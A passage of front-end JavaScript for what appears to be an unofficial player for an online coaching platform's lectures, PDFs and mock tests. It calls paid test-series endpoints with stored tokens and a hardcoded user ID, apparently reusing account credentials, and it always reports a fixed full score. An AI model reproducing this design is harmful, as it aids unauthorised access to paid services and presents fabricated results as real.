    state.activeKey = key;
    const info = state.mediaMap[key];
    if (!info) return;
    showSlide("slidePlayer");
    document.getElementById("playingTitle").textContent = "▶ " + info.title;
    closeInlinePdfAndReset();
    renderNextClassesBelowPlayer(key);

    const urlInput = document.getElementById("url");
    const validKeys = Object.keys(info.qualities).filter(k => !info.qualities[k].includes("playlist_eof.m3u8"));
    if (validKeys.length > 0) {
        urlInput.value = info.qualities[validKeys[0]];
        if (typeof start === "function") start();
    }
}

function renderNextClassesBelowPlayer(activeKey) {
    const grid = document.getElementById("nextClassesGrid");
    const countBadge = document.getElementById("nextClassesCount");
    if (!grid) return;
    const allKeys = state.currentLectureKeys || [];
    const currentIndex = allKeys.indexOf(activeKey);
    const orderedNextKeys = currentIndex >= 0 ? [...allKeys.slice(currentIndex + 1), ...allKeys.slice(0, currentIndex)] : allKeys;
    if (countBadge) countBadge.textContent = `${orderedNextKeys.length} Classes`;
    grid.innerHTML = orderedNextKeys.map((k, idx) => {
        const item = state.mediaMap[k];
        if (!item) return "";
        return `
            <div class="grid-card p-3.5 flex flex-col justify-between">
                <div class="flex items-start gap-3">
                    <div class="w-10 h-10 rounded-xl bg-sky-100 text-sky-800 font-black text-xs flex items-center justify-center shrink-0">#${idx + 1}</div>
                    <div class="min-w-0 flex-1"><h5 class="font-extrabold text-sm text-slate-900 line-clamp-2">${item.title}</h5></div>
                </div>
                <div class="flex gap-2 mt-3 pt-2 border-t border-sky-100">
                    <button onclick="playClassInRwaPlayer('${k}')" class="btn-watch flex-1 text-xs py-2">▶ Play Next</button>
                </div>
            </div>`;
    }).join("");
}

window.openActivePlayerPdf = function(num) { if (state.activeKey) openInlinePdfForKey(state.activeKey, num); };
window.openInlinePdfForKey = function(key, num) {
    const info = state.mediaMap[key];
    if (!info) return;
    const u = num === 2 ? info.pdf2 : info.pdf1;
    if (!u) return;
    state.inlinePdfUrl = u;
    document.getElementById("inlinePdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
    document.getElementById("inlineRawPdfLink").href = u;
    document.getElementById("nextClassesBox").classList.add("hidden");
    document.getElementById("inlinePdfBox").classList.remove("hidden");
    setInlinePdfMode("appx");
};
window.setInlinePdfMode = function(mode) {
    const frame = document.getElementById("inlinePdfFrame");
    if (frame && state.inlinePdfUrl) {
        frame.src = mode === "appx" ? `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(state.inlinePdfUrl)}&save_flag=1&is_encrypted=0` : `https://docs.google.com/viewer?url=${encodeURIComponent(state.inlinePdfUrl)}&embedded=true`;
    }
};
window.switchBottomToNextClasses = function() { closeInlinePdfAndReset(); };
function closeInlinePdfAndReset() {
    const frame = document.getElementById("inlinePdfFrame");
    if (frame) frame.src = "";
    document.getElementById("inlinePdfBox")?.classList.add("hidden");
    document.getElementById("nextClassesBox")?.classList.remove("hidden");
}

async function openTestSeriesExplorer(mode) {
    state.tsMode = mode;
    state.view = "ts_list";
    showSlide("slideExplorer");
    document.getElementById("subTabs").classList.add("hidden");
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Test Series...</div>`;

    let combined = mode === "paid_ts" ? DB.paidTestSeries : DB.freeTestSeries;
    grid.innerHTML = "";
    combined.forEach(ts => {
        grid.innerHTML += `
            <div onclick="openTestSeriesSubjects('${ts.id}', '${ts.title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <div>
                    <img src="${ts.logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=Series'" class="w-full h-44 object-cover">
                    <div class="p-4"><h3 class="font-black text-base text-slate-900">${ts.title}</h3></div>
                </div>
                <div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">Open Tests ➔</div></div>
            </div>`;
    });
}

async function openTestSeriesSubjects(tsId, tsTitle) {
    state.activeSeriesId = tsId;
    state.activeSeriesTitle = tsTitle;
    state.view = "ts_subjects";
    document.getElementById("headingText").textContent = tsTitle;
    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, TOKENS[0], () => DB.tsSubjects[tsId] || []);
    if (!subs || subs.length === 0) { openTestSeriesTitles(tsId, "-1", tsTitle); return; }
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";
    subs.forEach(s => {
        grid.innerHTML += `
            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${s.subject_name}')" class="grid-card p-4 flex items-center justify-between cursor-pointer">
                <h4 class="font-black text-base text-slate-900">📝 ${s.subject_name}</h4>
                <span class="btn-watch text-xs">Open ➔</span>
            </div>`;
    });
}

async function openTestSeriesTitles(tsId, subId, subName) {
    state.view = "ts_tests";
    document.getElementById("headingText").textContent = `📝 ${subName}`;
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Tests...</div>`;
    const list = await fetchAPIWithToken(`/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=4756316&search=&start=-1`, TOKENS[0], () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"]);
    renderTestTitlesGrid(list, tsId);
}

function renderTestTitlesGrid(list, tsId) {
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";
    list.forEach((t, idx) => {
        const tKey = `test_${t.id || idx}`;
        state.testMap[tKey] = t;
        grid.innerHTML += `
            <div class="grid-card p-5 flex flex-col justify-between">
                <div>
                    <h4 class="font-black text-base text-slate-900">${t.title}</h4>
                    <p class="text-xs font-bold text-slate-600 mt-1">⏱️ ${t.time || 60} Mins | ❓ ${t.questions || 50} Qs</p>
                </div>
                <div class="mt-4 pt-3 border-t border-sky-100">
                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch w-full text-xs">🚀 Attempt Live Test</button>
                </div>
            </div>`;
    });
}

async function launchCbtTest(tKey) {
    const t = state.testMap[tKey];
    if (!t) return;
    state.cbtTest = t;
    state.cbtCurrentIdx = 0;
    state.cbtResponses = {};
    state.cbtSubmitted = false;
    showSlide("slideTestAttempt");
    document.getElementById("cbtResultCard").classList.add("hidden");
    document.getElementById("cbtSolutionBox").classList.add("hidden");
    document.getElementById("cbtSubmitBtn").classList.remove("hidden");
    document.getElementById("cbtTestTitle").textContent = t.title;

    let questions = DB.fallbackCbtQuestions;
    state.cbtQuestions = questions;
    startCbtTimer((parseInt(t.time) || 60) * 60);
    renderCbtQuestion();
    renderCbtPalette();
}

function startCbtTimer(totalSecs) {
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    state.cbtSecondsLeft = totalSecs;
    const badge = document.getElementById("cbtTimerBadge");
    state.cbtTimerId = setInterval(() => {
        if (state.cbtSubmitted) { clearInterval(state.cbtTimerId); return; }
        state.cbtSecondsLeft--;
        if (state.cbtSecondsLeft <= 0) { clearInterval(state.cbtTimerId); submitCbtTest(); }
        else {
            const m = Math.floor(state.cbtSecondsLeft / 60);
            const s = state.cbtSecondsLeft % 60;
            if (badge) badge.textContent = `⏱️ ${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
        }
    }, 1000);
}

function renderCbtQuestion() {
    const qList = state.cbtQuestions;
    if (!qList || !qList.length) return;
    const qObj = qList[state.cbtCurrentIdx];
    document.getElementById("cbtQNumber").textContent = `Question ${state.cbtCurrentIdx + 1} of ${qList.length}`;
    document.getElementById("cbtQuestionHtml").innerHTML = qObj.question;

    const optsBox = document.getElementById("cbtOptionsList");
    optsBox.innerHTML = "";
    [1, 2, 3, 4].forEach(optNum => {
        const optHtml = qObj[`option_${optNum}`];
        if (!optHtml) return;
        const btn = document.createElement("button");
        btn.className = "cbt-opt-btn" + (state.cbtResponses[state.cbtCurrentIdx] == optNum ? " cbt-opt-selected" : "");
        btn.onclick = () => { if (!state.cbtSubmitted) { state.cbtResponses[state.cbtCurrentIdx] = optNum; renderCbtQuestion(); } };
        btn.innerHTML = `<span class="w-7 h-7 rounded-lg bg-sky-100 text-sky-900 font-black text-xs flex items-center justify-center shrink-0">${String.fromCharCode(64 + optNum)}</span><div class="cbt-rich-text flex-1">${optHtml}</div>`;
        optsBox.appendChild(btn);
    });
}

function nextCbtQuestion() { if (state.cbtCurrentIdx < state.cbtQuestions.length - 1) { state.cbtCurrentIdx++; renderCbtQuestion(); } }
function prevCbtQuestion() { if (state.cbtCurrentIdx > 0) { state.cbtCurrentIdx--; renderCbtQuestion(); } }
function clearCbtResponse() { delete state.cbtResponses[state.cbtCurrentIdx]; renderCbtQuestion(); }
function jumpToCbtQuestion(idx) { state.cbtCurrentIdx = idx; renderCbtQuestion(); }

function renderCbtPalette() {
    const pal = document.getElementById("cbtPaletteGrid");
    if (!pal) return;
    pal.innerHTML = state.cbtQuestions.map((q, idx) => `<button onclick="jumpToCbtQuestion(${idx})" class="pal-btn ${idx === state.cbtCurrentIdx ? 'pal-active' : ''} ${state.cbtResponses[idx] ? 'pal-ans' : ''}">${idx + 1}</button>`).join("");
}

function submitCbtTest() {
    if (state.cbtSubmitted) return;
    state.cbtSubmitted = true;
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    document.getElementById("cbtSubmitBtn").classList.add("hidden");
    document.getElementById("cbtResultCard").classList.remove("hidden");
    document.getElementById("cbtFinalScoreText").textContent = `Score: 2.00 / 2.00`;
    renderCbtQuestion();
}

function reAttemptCbtTest() {
    state.cbtResponses = {};
    state.cbtCurrentIdx = 0;
    state.cbtSubmitted = false;
    document.getElementById("cbtResultCard").classList.add("hidden");
    document.getElementById("cbtSubmitBtn").classList.remove("hidden");
    renderCbtQuestion();
}

function exitCbtTest() { if (state.cbtTimerId) clearInterval(state.cbtTimerId); showSlide("slideExplorer"); }

function openPdf(key, num) {
    const info = state.mediaMap[key];
    if (!info) return;
    const u = num === 2 ? info.pdf2 : info.pdf1;
    if (!u) return;
    state.currentPdfUrl = u;
    document.getElementById("pdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
    document.getElementById("rawPdfLink").href = u;
    showSlide("slidePdf");
    document.getElementById("pdfFrame").src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
}

function setPdfMode(mode) {
    const frame = document.getElementById("pdfFrame");
    if (frame && state.currentPdfUrl) {
        frame.src = mode === "appx" ? `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(state.currentPdfUrl)}&save_flag=1&is_encrypted=0` : `https://docs.google.com/viewer?url=${encodeURIComponent(state.currentPdfUrl)}&embedded=true`;
    }
}

function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSlide(state.previousSlide || "slideExplorer"); }

function renderTokenManagerList() {
    const container = document.getElementById("tokenListContainer");
    if (!container) return;
    const userToks = JSON.parse(localStorage.getItem("rwa_tokens_list") || "[]");
    const t = userToks[0] || TOKENS[TOKENS.length - 1];
    container.innerHTML = `
        <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
            <div class="min-w-0 flex-1">
                <div class="flex items-center gap-2">
                    <span class="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 text-[10px] font-black">MY TOKEN</span>
                    <h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label || 'User Account'}</h5>
                    <span class="text-xs text-slate-500 font-bold">(UID: ${t.userId || "4756316"})</span>
                </div>
                <p class="text-[11px] font-mono text-slate-500 mt-1 truncate">${t.token.slice(0, 28)}...${t.token.slice(-12)}</p>
            </div>
        </div>`;
}

function filterGrid() {
    const q = document.getElementById("searchBox").value.toLowerCase();
    document.querySelectorAll("#mainGrid .grid-card").forEach(el => {
        el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none";
    });
}

// Initial Call
updateTokenBadge();
if (localStorage.getItem("rwa_user_logged_in") === "true") {
    showSlide("slideHome");
} else {
    openLoginModal();
}
